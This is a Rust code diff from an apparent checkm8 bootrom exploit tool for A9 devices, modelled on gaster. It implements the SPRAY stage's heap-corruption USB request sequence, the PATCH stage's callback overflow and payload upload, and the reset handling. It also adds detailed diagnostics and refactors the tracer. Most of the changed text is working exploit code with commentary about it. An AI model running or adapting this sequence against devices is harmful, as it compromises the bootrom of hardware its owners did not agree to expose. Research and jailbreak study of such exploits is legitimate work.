@@ -907,7 +1250,7 @@ impl SetupStats {
             "attempts={} distinct_abort_windows={} [{}] span={}{} pad_sent={} pad_stall={} \
              pad_ok={} pad_timeout={} pad_other={} short_aborts={} zero_aborts={} \
              incomplete_aborts={} last_window_micros={} (usb_timeout={}ms abort_min={}ms \
-             overwrite_pad=0x{:X})",
+             pad_deadline_ms={}ms overwrite_pad=0x{:X})",
             self.attempts,
             self.windows.len(),
             windows,
@@ -928,6 +1271,7 @@ impl SetupStats {
             self.last_micros,
             self.usb_timeout,
             self.abort_min,
+            self.pad_deadline_ms,
             self.pad_target,
         )
     }
@@ -952,43 +1296,132 @@ fn one_line(s: &str) -> String {
 // SPRAY
 // ---------------------------------------------------------------------------
 
-/// gaster's `checkm8_usb_request_stall` (gaster.c:889-894): `bm=2, b=3,
-/// wValue=0, wIndex=0x80`, and a STALL is the answer we want.
+/// gaster's `checkm8_usb_request_stall` (gaster.c:889-894) as a pure request:
+/// `bm=2, b=3, wValue=0, wIndex=0x80`, and a STALL is the answer we want.
+///
+/// Pure so the wire parameters are pinned by a test rather than by inspection
+/// (`docs/VERIFICATION-live-run.md` B4). The `0x80` here is the same value
+/// PATCH's overflow uses (`gaster.c:1211`) — they are separate constants in the
+/// reference and are kept as separate constructors here.
+pub fn spray_stall_req() -> CtrlReq {
+    CtrlReq {
+        bm: 2,
+        b: 3,
+        value: 0,
+        index: 0x80,
+        length: 0,
+    }
+}
+
+/// gaster's `checkm8_usb_request_leak` request (gaster.c:866): an IN
+/// `GET_DESCRIPTOR(3)` of `EP0_MAX_PACKET_SZ` bytes, aborted after 1 ms.
+pub fn spray_leak_req(wvalue: u16, windex: u16) -> CtrlReq {
+    CtrlReq {
+        bm: 0x80,
+        b: 6,
+        value: wvalue,
+        index: windex,
+        length: EP0_MAX_PACKET_SZ,
+    }
+}
+
+/// gaster's `checkm8_no_leak` request (gaster.c:886): the same request with
+/// `3 * EP0_MAX_PACKET_SZ + 1` bytes requested.
+pub fn spray_no_leak_req(wvalue: u16, windex: u16) -> CtrlReq {
+    CtrlReq {
+        bm: 0x80,
+        b: 6,
+        value: wvalue,
+        index: windex,
+        length: 3 * EP0_MAX_PACKET_SZ + 1,
+    }
+}
+
+/// gaster.c:910 — the trailing `DFU_CLRSTATUS` whose length is the spray's own
+/// magic number, `3 * EP0_MAX_PACKET_SZ + 1`.
+pub fn spray_clr_status_req() -> CtrlReq {
+    CtrlReq {
+        bm: 0x21,
+        b: DFU_CLRSTATUS,
+        value: 0,
+        index: 0,
+        length: 3 * EP0_MAX_PACKET_SZ + 1,
+    }
+}
+
+/// `wValue` for the leak requests: `(3 << 8) | iSerialNumber` (gaster.c:866).
+///
+/// The index comes from [`Transport::ident_index`] — the string-descriptor index
+/// the transport already read **at open** — because gaster uses the cached
+/// `device_descriptor.i_serial_number` and never re-reads it here.
+///
+/// It must **not** come from [`Transport::identity`]: that is a live
+/// `GET_DESCRIPTOR`, and its own documentation says *"Do not call it between
+/// SETUP and PATCH"* (`usb.rs:472`). Calling it in the leak helpers put two
+/// extra EP0 transfers of up to 255 bytes into every spray iteration — five
+/// requests per iteration where the reference sends three — inside the loop
+/// whose request sequence *is* the heap corruption
+/// (`docs/VERIFICATION-live-run.md` B2).
+///
+/// Pure, so the mapping is pinned by a test without a device.
+pub fn leak_wvalue(ident_index: u8) -> u16 {
+    (3u16 << 8) | ident_index as u16
+}
+
+/// gaster's `checkm8_usb_request_stall` (gaster.c:889-894).
 fn usb_request_stall(io: &mut StageIo) -> XferResult {
-    let r = req_no_data(io, 2, 3, 0, 0x80, 0);
+    let r = req_ctrl(io, spray_stall_req());
     io.trace.xfer(Stage::Spray, "spray_request_stall", &r);
     r
 }
 
-/// `wValue` for the leak requests: `(3 << 8) | iSerialNumber` (gaster.c:866).
-fn leak_wvalue(io: &StageIo) -> u16 {
-    (3u16 << 8) | io.usb.identity().i_serial as u16
-}
-
 /// gaster's `checkm8_usb_request_leak` (gaster.c:862-867).
 fn usb_request_leak(io: &mut StageIo) -> XferResult {
-    let wvalue = leak_wvalue(io);
-    let index = io.opts.leak_windex;
-    let r = req_async(io, 0x80, 6, wvalue, index, EP0_MAX_PACKET_SZ, 1);
+    // The index is the one cached at open. Never `Transport::identity()` here:
+    // that is a live GET_DESCRIPTOR, and its own doc forbids it between SETUP and
+    // PATCH (usb.rs:472). See [`leak_wvalue`].
+    let wvalue = leak_wvalue(io.usb.ident_index());
+    let r = req_async_ctrl(io, spray_leak_req(wvalue, io.opts.leak_windex), 1);
     io.trace.xfer(Stage::Spray, "spray_request_leak", &r);
     r
 }
 
 /// gaster's `checkm8_no_leak` (gaster.c:882-887).
 fn no_leak(io: &mut StageIo) -> XferResult {
-    let wvalue = leak_wvalue(io);
-    let index = io.opts.leak_windex;
-    let r = req_async(
-        io,
-        0x80,
-        6,
-        wvalue,
-        index,
-        3 * EP0_MAX_PACKET_SZ + 1,
-        1,
-    );
+    // Cached index again — usb.rs:472 forbids a live identity read here.
+    let wvalue = leak_wvalue(io.usb.ident_index());
+    let r = req_async_ctrl(io, spray_no_leak_req(wvalue, io.opts.leak_windex), 1);
     io.trace.xfer(Stage::Spray, "spray_no_leak", &r);
     r
+}
+
+/// A SPRAY transfer the transport could not carry: libusb still owns the buffer,
+/// so the handle is poisoned and every later transfer comes back refused.
+///
+/// gaster simply retries forever — its wrapper returns false when a transfer was
+/// never reaped (`gaster.c:282`) — but a *bounded* sweep that retried here would
+/// spend its whole budget on transfers that never reached the wire, and the
+/// alternative is worse: a refused transfer has `transferred == 0`, so scoring
+/// it as a leak would report `Pass` on a dead handle
+/// (`docs/VERIFICATION-live-run.md` B3). Named, not spun.
+fn spray_transport_lost(
+    io: &mut StageIo,
+    iterations: u64,
+    what: &str,
+    r: &XferResult,
+) -> StageResult {
+    let detail = format!(
+        "the transport is poisoned: libusb still owned a buffer it could not reap, so no further \
+         transfer on this handle is a measurement. First noticed on SPRAY iteration {iterations} \
+         at {what} (status {}, transferred {}, micros {}, libusb_rc {}). gaster retries forever \
+         here (gaster.c:282 returns false for a transfer that was not completed); a bounded sweep \
+         reports it instead of spending its budget on transfers that never reach the wire.",
+        r.status, r.transferred, r.micros, r.libusb_rc
+    );
+    io.trace
+        .event("spray_transport_lost", Some(Stage::Spray), &detail);
+    println!("  SPRAY: FAILED - {}", one_line(&detail));
+    fail("TRANSPORT_DEVICE_LOST", detail, Some(r.clone()))
 }
 
 /// gaster's `checkm8_stage_spray` (gaster.c:896-918), **A9 branch**.
@@ -1030,6 +1463,23 @@ pub fn stage_spray(io: &mut StageIo) -> StageResult {
     let mut last: Option<XferResult> = None;
     let started = Instant::now();
 
+    // The leak's `wValue` is part of the sequence, so it is stated once, up
+    // front, from a value cached at open — not re-read from the device inside
+    // the loop (see [`leak_wvalue`]).
+    let leak_wvalue_used = leak_wvalue(io.usb.ident_index());
+    let begin = format!(
+        "leak_wValue=0x{leak_wvalue_used:04X} = (3<<8)|ident_index 0x{:02X}; leak/no-leak wIndex=0x{:X}; \
+         lengths leak=0x{EP0_MAX_PACKET_SZ:X} no_leak=0x{:X} clr_status=0x{:X}; ident_index is the \
+         string-descriptor index cached at open (gaster.c:866 uses device_descriptor.i_serial_number; \
+         no GET_DESCRIPTOR is issued inside the loop — usb.rs:472)",
+        io.usb.ident_index(),
+        io.opts.leak_windex,
+        3 * EP0_MAX_PACKET_SZ + 1,
+        3 * EP0_MAX_PACKET_SZ + 1
+    );
+    io.trace.event("spray_begin", Some(Stage::Spray), &begin);
+    println!("  SPRAY: {}", one_line(&begin));
+
     loop {
         iterations += 1;
         // The reference is genuinely unbounded here (gaster.c:902) and that is
@@ -1064,6 +1514,12 @@ pub fn stage_spray(io: &mut StageIo) -> StageResult {
             s.status == XferStatus::Stall,
             &format!("iteration={iterations} status={}", s.status),
         );
+        // A handle the transport has poisoned is not a device: stop naming it as
+        // an exploit failure and stop sweeping 20 000 transfers that never reach
+        // the wire.
+        if io.usb.is_poisoned() {
+            return spray_transport_lost(io, iterations, "checkm8_usb_request_stall", &s);
+        }
         let mut line = format!(
             "iteration={iterations} stall_status={} stall_micros={}",
             s.status, s.micros
@@ -1076,7 +1532,10 @@ pub fn stage_spray(io: &mut StageIo) -> StageResult {
                 " leak_status={} leak_xfer={} leak_micros={}",
                 l.status, l.transferred, l.micros
             ));
-            progressed = abort_completed(&l) && l.transferred == 0;
+            if io.usb.is_poisoned() {
+                return spray_transport_lost(io, iterations, "checkm8_usb_request_leak", &l);
+            }
+            progressed = leak_satisfied(&l);
             last = Some(l);
             if progressed {
                 leaks += 1;
@@ -1085,7 +1544,10 @@ pub fn stage_spray(io: &mut StageIo) -> StageResult {
                     " no_leak_status={} no_leak_xfer={} no_leak_micros={}",
                     n.status, n.transferred, n.micros
                 ));
-                progressed = abort_completed(&n) && n.transferred == 0;
+                if io.usb.is_poisoned() {
+                    return spray_transport_lost(io, iterations, "checkm8_no_leak", &n);
+                }
+                progressed = leak_satisfied(&n);
                 if progressed {
                     no_leaks += 1;
                 }
@@ -1110,7 +1572,7 @@ pub fn stage_spray(io: &mut StageIo) -> StageResult {
 
     // gaster.c:910 — the final clear-status, whose length is the spray's own
     // magic number (3 * EP0_MAX_PACKET_SZ + 1).
-    let clr = req_no_data(io, 0x21, DFU_CLRSTATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1);
+    let clr = req_ctrl(io, spray_clr_status_req());
     io.trace.xfer(Stage::Spray, "spray_clr_status", &clr);
     io.trace.event(
         "spray_summary",
@@ -1128,6 +1590,56 @@ pub fn stage_spray(io: &mut StageIo) -> StageResult {
 // PATCH
 // ---------------------------------------------------------------------------
 
+/// gaster.c:1211 — the callback overflow request as a pure request:
+/// `bm=2, b=3, wValue=0, wIndex=0x80`, carrying one `dfu_callback_t`.
+///
+/// `wIndex = 0x80` is load-bearing (HANDOFF §8.5: `a9ctl` hardcoded `0` and it
+/// was a real bug) and was previously pinned by nothing in the suite
+/// (`docs/VERIFICATION-live-run.md` Q4/B4). Pure, so a test can pin it.
+pub fn patch_overflow_req(len: u16) -> CtrlReq {
+    CtrlReq {
+        bm: 2,
+        b: 3,
+        value: 0,
+        index: 0x80,
+        length: len,
+    }
+}
+
+/// Is this upload chunk fully acknowledged? Used only to **record**, never to
+/// stop: see [`stage_patch`] for why a short chunk is loud but not fatal. Pure,
+/// so the difference between "delivered nothing" and "delivered everything" is
+/// pinned by a test.
+pub fn patch_chunk_complete(r: &XferResult, len: usize) -> bool {
+    r.status == XferStatus::Ok && r.transferred == len
+}
+
+/// The `patch_uploaded` line. Pure, so it is pinned by a test — in particular
+/// that a short chunk is *visible* in it rather than rounded away into a clean
+/// `uploaded=N` reading.
+pub fn patch_upload_summary(
+    attempted: usize,
+    acked: usize,
+    short_chunks: u64,
+    blob_sha256: &str,
+    state_ok: bool,
+) -> String {
+    let mut s = format!(
+        "chunk_loop: attempted={attempted} bytes, acknowledged={acked} bytes, \
+         short_or_failed_chunks={short_chunks}; sha256={blob_sha256}; \
+         manifest_walk_completed={state_ok} (gaster.c:1213-1222 checks neither: the chunk loop \
+         cannot fail and the walk's result is discarded)"
+    );
+    if short_chunks > 0 {
+        s.push_str(
+            "; PATCH_UPLOAD_SHORT was recorded and the stage continued, exactly as the reference \
+             does — the payload in the bootrom may be incomplete, and the PWND marker after the \
+             next reset is the only proof either way",
+        );
+    }
+    s
+}
+
 /// gaster's `checkm8_stage_patch` (gaster.c:1009-1229), A9 branch.
 ///
 /// Order matters and is fixed: the 48-byte callback overflow first (gaster.c:1211)
@@ -1137,7 +1649,7 @@ pub fn stage_spray(io: &mut StageIo) -> StageResult {
 /// (gaster.c:1218-1222). The bus reset that actually fires the overwritten
 /// `dfu_handle_bus_reset` happens in `run`, after this returns.
 ///
-/// Two deliberate, documented deviations, both observability:
+/// One deliberate, documented deviation, observability only:
 ///
 /// 1. gaster sends the overflow with `wIndex = 0x80` (gaster.c:1211) while its own
 ///    `checkm8_usb_request_stall` uses the same 0x80 (gaster.c:893). `a9ctl`
@@ -1146,12 +1658,23 @@ pub fn stage_spray(io: &mut StageIo) -> StageResult {
 ///    request. gaster's 0x80 is implemented here. (King's implementation instead
 ///    decomposes this as `(0, 0, 0, 0)`; that is a different variant of the
 ///    exploit, not a fix for gaster's sequence, and is not what we run.)
-/// 2. gaster's upload loop cannot fail: `send_usb_control_request` returns `true`
-///    unconditionally (gaster.c:239) and its `transfer_ret` is passed as NULL, so
-///    a short chunk is silently ignored. Here a chunk that does not return OK with
-///    every byte sent fails the stage with `PATCH_UPLOAD_SHORT`. A short chunk
-///    means the payload in the bootrom is garbage; reporting that is the point of
-///    this rewrite.
+///
+/// The upload loop is **not** a behaviour deviation, only a reporting one.
+/// gaster's chunk loop cannot fail — `ret` is `send_usb_control_request`
+/// (`gaster.c:1215`), which is `return true;` unconditionally (`:226-240`) and is
+/// already true from the STALLed overflow at `:1212` — so `checkm8_stage_patch`
+/// returns true and proceeds to the suffix, the end DNLOAD, the MANIFEST walk and
+/// the reset even when a chunk delivered nothing. Here a short chunk is recorded
+/// loudly (predicate `PATCH_UPLOAD_SHORT`, an event and a printed warning) and the
+/// stage continues the same way. This is not a nicety: stopping there discarded
+/// five of an attempt's seven transfers in the last live run, and a SETUP pass
+/// that reaches PATCH is rare and non-deterministic (0 pad STALLs in one 64-round
+/// run, 3 in another), so an attempt must keep its whole sequence.
+///
+/// **Honest limit:** "the loop continues" cannot be pinned offline — it needs a
+/// `Transport` — so it is inspection-pinned, like the `pad_stalls` counter. The
+/// pure parts ([`patch_chunk_complete`], [`patch_upload_summary`]) are tested;
+/// the loop's control flow is not, and no test pretends otherwise.
 pub fn stage_patch(io: &mut StageIo, built: &BuiltPayload) -> StageResult {
     if built.overwrite.len() != OVERWRITE_STRUCT_SIZE {
         return fail(
@@ -1168,13 +1691,7 @@ pub fn stage_patch(io: &mut StageIo, built: &BuiltPayload) -> StageResult {
     // gaster.c:1211 — bm=2, b=3, wValue=0, wIndex=0x80.
     let overflow = req_out(
         io,
-        CtrlReq {
-            bm: 2,
-            b: 3,
-            value: 0,
-            index: 0x80,
-            length: built.overwrite.len() as u16,
-        },
+        patch_overflow_req(built.overwrite.len() as u16),
         &built.overwrite,
     );
     io.trace.xfer(Stage::Patch, "patch_overflow_callback", &overflow);
@@ -1203,7 +1720,12 @@ pub fn stage_patch(io: &mut StageIo, built: &BuiltPayload) -> StageResult {
     }
 
     let chunk_sz = DFU_MAX_TRANSFER_SZ as usize;
-    let mut sent = 0usize;
+    // `attempted` is every byte gaster's loop would put on the wire; `acked` is
+    // what the device acknowledged in full. They are reported separately because
+    // the difference is what the PWND check after the reset is up against.
+    let mut attempted = 0usize;
+    let mut acked = 0usize;
+    let mut short_chunks = 0u64;
     for (i, chunk) in built.blob.chunks(chunk_sz).enumerate() {
         let r = req_out(
             io,
@@ -1217,21 +1739,47 @@ pub fn stage_patch(io: &mut StageIo, built: &BuiltPayload) -> StageResult {
             chunk,
         );
         io.trace.xfer(Stage::Patch, "patch_upload_chunk", &r);
-        if !(r.status == XferStatus::Ok && r.transferred == chunk.len()) {
-            return fail(
-                "PATCH_UPLOAD_SHORT",
-                format!(
-                    "payload chunk {i} ({} bytes at offset {sent}) returned {} with {} bytes \
-                     sent. gaster ignores this (gaster.c:1215 passes no transfer_ret); a short \
-                     chunk means the payload in the bootrom is incomplete.",
-                    chunk.len(),
-                    r.status,
-                    r.transferred
-                ),
-                Some(r),
+        // Loud, never fatal — gaster's chunk loop cannot stop (`gaster.c:1213-1216`
+        // with `ret` unconditionally true from `:226-240`), and aborting here
+        // discarded five of an attempt's seven transfers in the last live run.
+        // The predicate code is kept exactly so the diagnosis is greppable and
+        // countable (`Counters::predicate_failed("PATCH_UPLOAD_SHORT")`); only its
+        // power to stop the run is removed.
+        let complete = patch_chunk_complete(&r, chunk.len());
+        io.trace.predicate(
+            Stage::Patch,
+            "PATCH_UPLOAD_SHORT",
+            complete,
+            &format!(
+                "chunk {i} at offset {attempted}: {} bytes requested, {} returned, status {}. \
+                 gaster cannot fail here (`gaster.c:226-240` returns true unconditionally and \
+                 `:1215` passes no transfer_ret), so the reference continues to the suffix, the \
+                 end DNLOAD, the MANIFEST walk and the reset; this stage does the same.",
+                chunk.len(),
+                r.transferred,
+                r.status
+            ),
+        );
+        if complete {
+            acked += chunk.len();
+        } else {
+            short_chunks += 1;
+            let detail = format!(
+                "payload chunk {i} ({} bytes at offset {attempted}) returned {} with {} bytes \
+                 sent. PATCH_UPLOAD_SHORT: the payload in the bootrom may be incomplete, and the \
+                 PWND marker after the reset is the only proof either way.",
+                chunk.len(),
+                r.status,
+                r.transferred
+            );
+            io.trace
+                .event("patch_upload_short", Some(Stage::Patch), &detail);
+            println!(
+                "  PATCH: WARNING - [PATCH_UPLOAD_SHORT] {}",
+                one_line(&detail)
             );
         }
-        sent += chunk.len();
+        attempted += chunk.len();
     }
 
     let suffix = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN);
@@ -1242,6 +1790,12 @@ pub fn stage_patch(io: &mut StageIo, built: &BuiltPayload) -> StageResult {
     // gaster.c:1220-1222 ignores the result of these three; the real proof of a
     // pwn is the PWND marker after the next bus reset, so a failure here is
     // recorded loudly and does not fail the stage.
+    //
+    // Measured behaviour worth knowing before reading a failure into it: after a
+    // *successful* upload the walk comes back TIMEOUT. That is consistent with
+    // the payload having landed and the machine having left its DFU request
+    // loop; gaster does not check the walk and the marker decides. It is **not**
+    // evidence that the upload failed, and not proof that it succeeded either.
     let mut state_ok = true;
     for (state, label) in [
         (DFU_STATE_MANIFEST_SYNC, "patch_status_manifest_sync"),
@@ -1256,20 +1810,18 @@ pub fn stage_patch(io: &mut StageIo, built: &BuiltPayload) -> StageResult {
         "patch_uploaded",
         Some(Stage::Patch),
         &format!(
-            "overflow={} bytes STALLed, uploaded={} bytes, sha256={}, manifest_walk_ok={} \
-             (gaster.c:1218-1222 does not check it; the PWND marker after the next reset is \
-             the real proof)",
+            "overflow={} bytes STALLed; {}",
             built.overwrite.len(),
-            sent,
-            built.blob_sha256,
-            state_ok
+            patch_upload_summary(attempted, acked, short_chunks, &built.blob_sha256, state_ok)
         ),
     );
     if !state_ok {
         println!(
             "  PATCH: warning - the MANIFEST state walk after the upload did not complete \
-             cleanly; gaster does not check it (gaster.c:1220-1222). Waiting for the PWND \
-             marker after the reset."
+             cleanly; gaster does not check it (gaster.c:1220-1222). A TIMEOUT here after a \
+             successful upload is consistent with the payload having landed and the machine \
+             having left its DFU request loop — it is not evidence that the upload failed, and \
+             not proof that it succeeded. Waiting for the PWND marker after the reset."
         );
     }
     StageResult::Pass
@@ -1278,6 +1830,28 @@ pub fn stage_patch(io: &mut StageIo, built: &BuiltPayload) -> StageResult {
 // ---------------------------------------------------------------------------
 // run / run_one_stage
 // ---------------------------------------------------------------------------
+
+/// The diagnostic stop: SETUP's pad STALL is the proof (gaster.c:853), so the
+/// run stops there instead of spending PATCH on an unproven SETUP (HANDOFF
+/// §6.3). Pure, and shared by the round loop and the single-stage path — before
+/// the fix the flag was honoured **only** in the round loop, so
+/// `run --stage setup --stop-after-setup-stall` reported a reset refusal instead
+/// of the proof it exists to produce (`docs/VERIFICATION-live-run.md` B1.2).
+fn setup_stall_stop_requested(stage: Stage, passed: bool, opts: &RunOptions) -> bool {
+    passed && stage == Stage::Setup && opts.stop_after_setup_stall
+}
+
+/// The outcome of that stop. Pure, so the words are pinned by a test: it must
+/// name the pass condition it proved, what was not attempted, and that the
+/// mandatory post-attempt reset (gaster.c:1268) still happened first.
+fn setup_stall_stop_outcome(setup_attempts: u64, pad_stalls: u64) -> RunOutcome {
+    RunOutcome::Aborted(format!(
+        "diagnostic stop (--stop-after-setup-stall): SETUP reached its pass condition — a STALL on \
+         the pad request (gaster.c:853) — after {setup_attempts} attempt(s) with {pad_stalls} pad \
+         STALL(s). The bus reset after the attempt was performed (gaster.c:1268). SPRAY and PATCH \
+         were not attempted and no payload was uploaded. The device was left reset, not pwned."
+    ))
+}
 
 fn dispatch(io: &mut StageIo, stage: Stage, built: &BuiltPayload) -> StageResult {
     match stage {
@@ -1301,10 +1875,9 @@ fn dispatch(io: &mut StageIo, stage: Stage, built: &BuiltPayload) -> StageResult
 /// device** (INTERFACE.md §0.1 allows a non-Lead to run this path and only this
 /// path). Planning against an attached device is what `a9pwn plan` does.
 pub fn run(opts: RunOptions) -> RunOutcome {
-    if let Err(e) = payload::verify_blob_hashes() {
-        return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
-    }
-
+    // The single-stage and dry-run paths never used this tracer: a dry run must
+    // not create a trace file at all, and `run_one_stage` owns its own. Kept
+    // exactly as it was.
     let filter = opts.stage_filter;
     if let Some(stage) = filter {
         return run_one_stage(stage, opts);
@@ -1317,6 +1890,41 @@ pub fn run(opts: RunOptions) -> RunOutcome {
         Ok(t) => t,
         Err(e) => return RunOutcome::Aborted(format!("cannot open trace file: {e}")),
     };
+    run_with_tracer(opts, &mut tracer)
+}
+
+/// [`run`], but against a tracer the caller owns.
+///
+/// Added so a run has exactly **one** writer to `opts.trace_path`. `main.rs` was
+/// creating a tracer for the verdict *and* `run` was creating its own, and both
+/// opened the same file: the JSONL interleaved into a corrupted line
+/// (`{"seq":2,"st{"seq":2,…`), and the verdict was then classified against an
+/// empty counter set while the real counters sat in the other tracer — the whole
+/// instrumentation investment bypassed exactly when a failure needed explaining.
+///
+/// `opts.trace_path` is deliberately **not** opened here: the caller's tracer
+/// decides where (and whether) anything is written. Additive — `INTERFACE.md`
+/// §4's `run(opts)` signature is unchanged and remains the wrapper.
+///
+/// Dry runs and `opts.stage_filter` are handled here too, so this is a complete
+/// replacement for [`run`] and not a partial one:
+///
+/// * `stage_filter` → [`run_one_stage_with_tracer`], which writes to this tracer.
+/// * `dry_run` → the dry-run plan, which issues no transfer and writes no
+///   tracer line at all, so there is nothing to attribute. It must not create or
+///   truncate `opts.trace_path` either.
+pub fn run_with_tracer(opts: RunOptions, tracer: &mut Tracer) -> RunOutcome {
+    if let Err(e) = payload::verify_blob_hashes() {
+        return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
+    }
+
+    if let Some(stage) = opts.stage_filter {
+        return run_one_stage_with_tracer(stage, opts, tracer);
+    }
+    if opts.dry_run {
+        return dry_run_all(&opts);
+    }
+
     tracer.event(
         "run_start",
         None,
@@ -1335,10 +1943,10 @@ pub fn run(opts: RunOptions) -> RunOutcome {
         ),
     );
 
-    let outcome = run_rounds(&opts, &mut tracer);
+    let outcome = run_rounds(&opts, tracer);
     tracer.event("run_end", None, &format!("{outcome:?}"));
     tracer.flush();
-    print_stage_summary(&tracer, "stages");
+    print_stage_summary(tracer, "stages");
     outcome
 }
 
@@ -1510,95 +2118,30 @@ fn run_rounds(opts: &RunOptions, tracer: &mut Tracer) -> RunOutcome {
             (_, false) => Stage::Reset,
             (Stage::Pwned, _) => Stage::Pwned,
         };
-        let stop_here = passed && executed == Stage::Setup && opts.stop_after_setup_stall;
+        let stop_here = setup_stall_stop_requested(executed, passed, opts);
         stage = next;
 
-        // gaster.c:1268 — after EVERY attempt, pass or fail.
-        //
-        // The reset is not trusted, it is verified. gaster discards the result
-        // (gaster.c:198-199) and libusb returns LIBUSB_SUCCESS unconditionally on
-        // Windows (`windows_winusb.c:3419`), silently skipping the reset
-        // altogether unless interface 0 was claimed (`:3414-3416`). The
-        // transport's `bus_reset_delivered` is the judgement over all three
-        // measured facts, and it is what decides here.
-        match usb.reset() {
-            Ok(report) => {
-                // `Tracer::reset` is the typed helper the `resets_real` /
-                // `resets_pipe_cycle` counters are driven by.
-                tracer.predicate(
-                    Stage::Reset,
-                    "bus_reset_delivered",
-                    report.bus_reset_delivered,
-                    &format!(
-                        "after {}: rc={} capability=\"{}\" interface_claimed={} micros={} {}",
-                        executed.name(),
-                        report.libusb_rc,
-                        report.capability.as_str(),
-                        report.interface_claimed,
-                        report.micros,
-                        report.note
-                    ),
-                );
-                tracer.reset(
-                    report.bus_reset_delivered,
-                    &format!(
-                        "after {} (round {rounds}): rc={} capability=\"{}\" interface_claimed={} \
-                         micros={} {}",
-                        executed.name(),
-                        report.libusb_rc,
-                        report.capability.as_str(),
-                        report.interface_claimed,
-                        report.micros,
-                        report.note
-                    ),
-                );
-                if !report.bus_reset_delivered && !opts.allow_winusb {
-                    return RunOutcome::Aborted(format!(
-                        "the bus reset after {} was not delivered (\"{}\", rc={}, \
-                         interface_claimed={}): {}. The reset is what both cleans the DFU state \
-                         and, after PATCH, fires the overwritten dfu_handle_bus_reset callback, \
-                         so continuing would be a different experiment. --allow-winusb overrides \
-                         only to prove the failure.",
-                        executed.name(),
-                        report.capability.as_str(),
-                        report.libusb_rc,
-                        report.interface_claimed,
-                        report.note
-                    ));
-                }
-            }
-            Err(e) => {
-                // Not counted as real and not as a pipe cycle: the call itself
-                // failed, which is a third outcome (`trace::kind::RESET` counts
-                // the attempt only).
-                tracer.event(
-                    kind::RESET,
-                    Some(Stage::Reset),
-                    &format!("after {} (round {rounds}): the reset call failed: {e}", executed.name()),
-                );
-                if !opts.allow_winusb {
-                    return RunOutcome::Aborted(format!(
-                        "the bus reset after round {rounds} failed: {e}. checkm8 needs a real \
-                         reset after every attempt (gaster.c:1268)."
-                    ));
-                }
-            }
+        // gaster.c:1268 — after EVERY attempt, pass or fail. The recording, the
+        // evidence gate and the messages all live in `reset_after_attempt`,
+        // shared with the single-stage path so the two cannot drift apart again
+        // (the B1 defect was this same wrong condition written in both places).
+        if let Err(outcome) =
+            reset_after_attempt(&mut usb, tracer, opts, "post-stage", executed.name())
+        {
+            return outcome;
         }
 
         // gaster.c:1273 — close, then re-open at the top of the loop.
         drop(usb);
 
         if stop_here {
+            let c = tracer.counters();
             tracer.event(
                 "stop_after_setup_stall",
                 Some(Stage::Setup),
                 &format!("SETUP passed on round {rounds}; stopping before SPRAY/PATCH"),
             );
-            return RunOutcome::Aborted(format!(
-                "diagnostic stop (--stop-after-setup-stall): SETUP reached its pad STALL on \
-                 round {rounds}. SPRAY and PATCH were not attempted and no payload was \
-                 uploaded. The device was left reset, not pwned."
-            ));
+            return setup_stall_stop_outcome(c.setup_attempts, c.setup_stall_seen);
         }
 
         if opts.settle_ms > 0 {
@@ -1624,6 +2167,8 @@ pub fn run_one_stage(stage: Stage, opts: RunOptions) -> RunOutcome {
     if let Err(e) = payload::verify_blob_hashes() {
         return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
     }
+    // A dry run issues no transfer and writes no tracer line, so it needs no
+    // tracer — and `--dry-run --trace X` must not create or truncate `X`.
     if opts.dry_run {
         return dry_run_stage(stage, &opts);
     }
@@ -1632,6 +2177,31 @@ pub fn run_one_stage(stage: Stage, opts: RunOptions) -> RunOutcome {
         Ok(t) => t,
         Err(e) => return RunOutcome::Aborted(format!("cannot open trace file: {e}")),
     };
+    run_one_stage_with_tracer(stage, opts, &mut tracer)
+}
+
+/// [`run_one_stage`], but against a tracer the caller owns — the single-stage
+/// half of [`run_with_tracer`]. Same contract and same guards; only the tracer's
+/// ownership differs, so a caller that needs the counters afterwards (the
+/// verdict does) can keep its own writer and avoid a second one opening the same
+/// file.
+pub fn run_one_stage_with_tracer(
+    stage: Stage,
+    opts: RunOptions,
+    tracer: &mut Tracer,
+) -> RunOutcome {
+    if stage == Stage::Pwned {
+        return RunOutcome::Aborted(
+            "PWNED is a state the device is in, not a stage that can be run".to_string(),
+        );
+    }
+    if let Err(e) = payload::verify_blob_hashes() {
+        return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
+    }
+    if opts.dry_run {
+        return dry_run_stage(stage, &opts);
+    }
+
     tracer.event(
         "single_stage_start",
         Some(stage),
@@ -1643,10 +2213,10 @@ pub fn run_one_stage(stage: Stage, opts: RunOptions) -> RunOutcome {
         ),
     );
 
-    let outcome = one_stage_core(stage, &opts, &mut tracer);
+    let outcome = one_stage_core(stage, &opts, tracer);
     tracer.event("run_end", Some(stage), &format!("{outcome:?}"));
     tracer.flush();
-    print_stage_summary(&tracer, stage.name());
+    print_stage_summary(tracer, stage.name());
     outcome
 }
 
@@ -1726,7 +2296,7 @@ fn one_stage_core(stage: Stage, opts: &RunOptions, tracer: &mut Tracer) -> RunOu
                 "RESET reached MANIFEST_WAIT_RESET",
             ),
         }
-        if let Err(e) = reset_device(&mut usb, tracer, opts, "precondition") {
+        if let Err(e) = reset_after_attempt(&mut usb, tracer, opts, "precondition", "RESET") {
             return e;
         }
         drop(usb);
@@ -1763,8 +2333,24 @@ fn one_stage_core(stage: Stage, opts: &RunOptions, tracer: &mut Tracer) -> RunOu
         ),
     }
 
-    if let Err(e) = reset_device(&mut usb, tracer, opts, "post-stage") {
+    // gaster.c:1268 — the reset after the attempt is mandatory, and it happens
+    // **before** the diagnostic stop: the stop reports SETUP's proof, it does not
+    // skip the trigger. `--stop-after-setup-stall` was honoured only by the round
+    // loop before this, so `run --stage setup --stop-after-setup-stall` reported
+    // a reset refusal instead of the STALL it exists to prove
+    // (`docs/VERIFICATION-live-run.md` B1.2).
+    let passed = result.is_pass();
+    if let Err(e) = reset_after_attempt(&mut usb, tracer, opts, "post-stage", stage.name()) {
         return e;
+    }
+    if setup_stall_stop_requested(stage, passed, opts) {
+        let c = tracer.counters();
+        tracer.event(
+            "stop_after_setup_stall",
+            Some(Stage::Setup),
+            "SETUP passed; stopping before SPRAY/PATCH",
+        );
+        return setup_stall_stop_outcome(c.setup_attempts, c.setup_stall_seen);
     }
     drop(usb);
 
@@ -1803,65 +2389,253 @@ fn one_stage_core(stage: Stage, opts: &RunOptions, tracer: &mut Tracer) -> RunOu
     RunOutcome::Aborted(msg)
 }
 
